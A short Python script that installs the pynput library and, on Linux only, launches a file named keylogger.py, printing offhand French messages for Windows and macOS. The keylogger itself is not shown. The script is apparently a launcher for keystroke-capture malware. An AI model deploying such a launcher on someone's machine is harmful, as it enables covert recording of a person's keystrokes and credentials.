import os
import sys
import subprocess

result = sys.platform

os.system ("pip3 install pynput")

if 'win32' in result or 'win64' in result:
    print ('Windows mais du coup ça marche pas')
elif 'darwin' in result:
    print ('MacOS mais osef')
else:
    print ('Linux')
    os.system ("python3 keylogger.py")